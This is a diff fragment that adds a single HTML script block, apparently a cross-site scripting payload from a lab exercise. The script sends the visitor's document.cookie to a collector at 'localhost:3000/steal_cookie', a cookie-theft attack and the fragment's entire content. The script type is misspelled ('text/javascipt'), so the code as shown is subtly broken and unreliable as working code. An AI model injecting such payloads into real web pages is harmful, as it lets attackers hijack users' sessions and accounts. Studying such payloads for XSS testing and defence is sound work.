@@ -1,0 +1,6 @@
+<script type="text/javascipt">
+ var x = new XMLHttpRequest();
+ x.open("GET", "http://localhost:3000/steal_cookie?cookie=
+"+(document.cookie));
+ x.send()
+ </script>
